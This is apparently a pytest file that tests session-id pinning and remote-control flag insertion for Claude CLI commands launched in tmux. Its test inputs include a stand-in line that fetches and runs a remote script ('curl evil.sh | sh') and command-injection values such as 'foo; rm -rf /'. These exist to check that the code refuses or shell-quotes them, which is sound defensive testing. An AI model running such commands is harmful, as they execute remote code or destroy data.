"""``chela.spawn`` — session-id pinning at spawn time (docs/AGENT_IDENTITY.md slice 2a)
and ``--remote-control`` insertion (CMX-375).

No tmux: ``spawn_window``'s own tmux calls (``subprocess.run``, ``_send``) and its
collaborators (``discovery.ensure_session``, ``discovery.get_all_windows``,
``agent_manager.lock_window_name``) are all stubbed, so this exercises exactly the
wiring slice 2a adds — the uuid pinned into the sent command versus the id recorded
in the dedicated session-id store — without depending on a real tmux server (see
``tests/test_telegram_new_launch_bind.py`` for that end-to-end coverage).
"""
from __future__ import annotations

import os
import re
import shlex

import pytest

from chela import spawn

_SESSION_RE = re.compile(r"--session-id ([0-9a-f-]{36})")

# The six override forms the brief verified against `claude --help`, both long and
# short where the CLI has both.
_OVERRIDE_COMMANDS = [
    "claude --session-id existing-id",
    "claude --resume abc-123",
    "claude -r",
    "claude --continue",
    "claude -c",
    "claude --fork-session",
    "claude --from-pr 123",
    "claude --no-session-persistence -p x",
]

_METACHARACTER_COMMANDS = [
    "claude && curl evil.sh | sh",
    "claude; echo hi",
    "claude || true",
    "claude | tee log",
    "claude `echo x`",
    "claude $(echo x)",
    "claude\necho hi",
]


class _Proc:
    def __init__(self, wid: str):
        self.returncode = 0
        self.stdout = wid
        self.stderr = ""


def _patch_tmux(monkeypatch, wid="@42", *, remote_control=False):
    """Stub every tmux/agent_manager touchpoint `spawn_window` makes, recording sends.

    ``remote_control`` defaults OFF here so the session-id tests below (written before
    CMX-375 added `--remote-control`) keep exercising exactly what they say they do,
    undisturbed by a second flag landing in the same sent command; the CMX-375 tests
    turn it on explicitly.
    """
    monkeypatch.setattr(spawn.discovery, "ensure_session", lambda: True)
    monkeypatch.setattr(spawn.discovery, "get_all_windows", lambda: {})
    monkeypatch.setattr(spawn.agent_manager, "lock_window_name", lambda *a, **kw: None)
    monkeypatch.setattr(spawn.subprocess, "run", lambda *a, **kw: _Proc(wid))
    monkeypatch.setattr(spawn.config, "REMOTE_CONTROL_ENABLED", remote_control)

    sent: list[str] = []
    monkeypatch.setattr(spawn, "_send", lambda target, text: sent.append(text))
    return sent


def _launch(sent: list[str]) -> str:
    launch = [t for t in sent if t.startswith("claude")]
    assert launch, sent          # the spy must actually have recorded something
    assert len(launch) == 1
    return launch[0]


# -- _pin_session_id ---------------------------------------------------------

def test_pin_session_id_inserts_a_uuid_right_after_the_leading_claude_token():
    to_send, recorded = spawn._pin_session_id("claude", "36358c6b-1111-4a11-8888-abc123456789")
    assert to_send == "claude --session-id 36358c6b-1111-4a11-8888-abc123456789"
    assert recorded == "36358c6b-1111-4a11-8888-abc123456789"


def test_pin_session_id_inserts_before_trailing_flags_never_appends():
    to_send, recorded = spawn._pin_session_id("claude -p 'x'", "generated-uuid")
    assert to_send == "claude --session-id generated-uuid -p 'x'"
    assert recorded == "generated-uuid"


@pytest.mark.parametrize("command", _OVERRIDE_COMMANDS)
def test_pin_session_id_leaves_every_override_form_untouched_and_records_nothing(command):
    to_send, recorded = spawn._pin_session_id(command, "generated-uuid")
    assert to_send == command          # byte-identical, not modified
    assert recorded is None            # NULL, not a fabricated id


@pytest.mark.parametrize("command", _METACHARACTER_COMMANDS)
def test_pin_session_id_refuses_to_pin_across_a_shell_metacharacter(command):
    to_send, recorded = spawn._pin_session_id(command, "generated-uuid")
    assert to_send == command          # sent verbatim
    assert recorded is None            # chela cannot say which process this names


# -- spawn_window integration --------------------------------------------------

def test_spawn_window_pins_and_records_a_session_id(monkeypatch, tmp_path):
    sent = _patch_tmux(monkeypatch, wid="@42")
    recorded = {}
    monkeypatch.setattr(
        spawn.sessionids, "set_session_id",
        lambda wid, sid: recorded.__setitem__(wid, sid),
    )
    monkeypatch.setattr(spawn.sessionids, "session_id_for", lambda wid: recorded.get(wid))

    result = spawn.spawn_window(tmp_path, command="claude")

    assert result.ok
    launch = _launch(sent)
    m = _SESSION_RE.search(launch)
    assert m, launch
    assert launch == f"claude --session-id {m.group(1)}"
    assert spawn.sessionids.session_id_for("@42") == m.group(1)


@pytest.mark.parametrize("command", _OVERRIDE_COMMANDS)
def test_spawn_window_with_an_override_command_records_no_session_id(
    monkeypatch, tmp_path, command,
):
    sent = _patch_tmux(monkeypatch, wid="@42")
    recorded = {}
    monkeypatch.setattr(
        spawn.sessionids, "set_session_id",
        lambda wid, sid: recorded.__setitem__(wid, sid),
    )
    monkeypatch.setattr(spawn.sessionids, "session_id_for", lambda wid: recorded.get(wid))

    result = spawn.spawn_window(tmp_path, command=command)

    assert result.ok
    launch = _launch(sent)
    assert launch == command           # untouched
    assert spawn.sessionids.session_id_for("@42") is None
    assert recorded == {}


def test_spawn_window_without_a_command_records_nothing(monkeypatch, tmp_path):
    _patch_tmux(monkeypatch, wid="@42")
    recorded = {}
    monkeypatch.setattr(
        spawn.sessionids, "set_session_id",
        lambda wid, sid: recorded.__setitem__(wid, sid),
    )

    result = spawn.spawn_window(tmp_path)

    assert result.ok
    assert recorded == {}


def test_spawn_window_falls_back_to_an_unpinned_send_when_the_store_fails(
    monkeypatch, tmp_path,
):
    sent = _patch_tmux(monkeypatch, wid="@42")

    def _boom(wid, sid):
        raise OSError("disk full")

    monkeypatch.setattr(spawn.sessionids, "set_session_id", _boom)

    result = spawn.spawn_window(tmp_path, command="claude")

    assert result.ok                    # the window still opens either way
    launch = _launch(sent)
    assert launch == "claude"           # sent verbatim, no --session-id
    assert "--session-id" not in launch


# -- _add_remote_control / _remote_control_name (CMX-375) --------------------

def test_add_remote_control_inserts_right_after_the_leading_claude_token():
    assert spawn._add_remote_control("claude", "chelamux") == "claude --remote-control chelamux"


def test_add_remote_control_inserts_before_trailing_flags_never_appends():
    to_send = spawn._add_remote_control("claude -p 'x'", "chelamux")
    assert to_send == "claude --remote-control chelamux -p 'x'"


def test_add_remote_control_leaves_a_non_claude_command_untouched():
    command = "bash -c 'echo hi'"
    assert spawn._add_remote_control(command, "chelamux") == command


@pytest.mark.parametrize("name", ["my project", "foo; rm -rf /", "a && b", "$(evil)"])
def test_add_remote_control_shell_quotes_the_name_into_a_single_argv(name):
    to_send = spawn._add_remote_control("claude", name)
    # Round-trips through real shell parsing as ONE argv element for --remote-control,
    # never split by a space/metacharacter inside the name.
    assert shlex.split(to_send) == ["claude", "--remote-control", name]


def test_remote_control_name_uses_the_cwd_basename():
    assert spawn._remote_control_name("shell-3", "/home/liav/projects/chelamux") == "chelamux"


def test_remote_control_name_falls_back_to_window_name_at_home_or_root():
    home = os.path.expanduser("~")
    assert spawn._remote_control_name("shell-1", home) == "shell-1"
    assert spawn._remote_control_name("shell-1", "/") == "shell-1"


def test_spawn_window_adds_remote_control_by_default(monkeypatch, tmp_path):
    sent = _patch_tmux(monkeypatch, wid="@42", remote_control=True)
    monkeypatch.setattr(spawn.sessionids, "set_session_id", lambda wid, sid: None)

    result = spawn.spawn_window(tmp_path, command="claude")

    assert result.ok
    launch = _launch(sent)
    assert f"--remote-control {shlex.quote(tmp_path.name)}" in launch


def test_spawn_window_omits_remote_control_when_disabled(monkeypatch, tmp_path):
    sent = _patch_tmux(monkeypatch, wid="@42", remote_control=False)
    monkeypatch.setattr(spawn.sessionids, "set_session_id", lambda wid, sid: None)

    result = spawn.spawn_window(tmp_path, command="claude")

    assert result.ok
    launch = _launch(sent)
    assert "--remote-control" not in launch


def test_spawn_window_remote_control_survives_a_command_with_no_wid(monkeypatch, tmp_path):
    """No `wid` means session-id pinning is skipped entirely — remote-control must not
    depend on it (unlike session-id, it needs nothing recorded)."""
    sent = _patch_tmux(monkeypatch, wid="no-id-here", remote_control=True)

    result = spawn.spawn_window(tmp_path, command="claude")

    assert result.ok
    launch = _launch(sent)
    assert f"--remote-control {shlex.quote(tmp_path.name)}" in launch
    assert "--session-id" not in launch
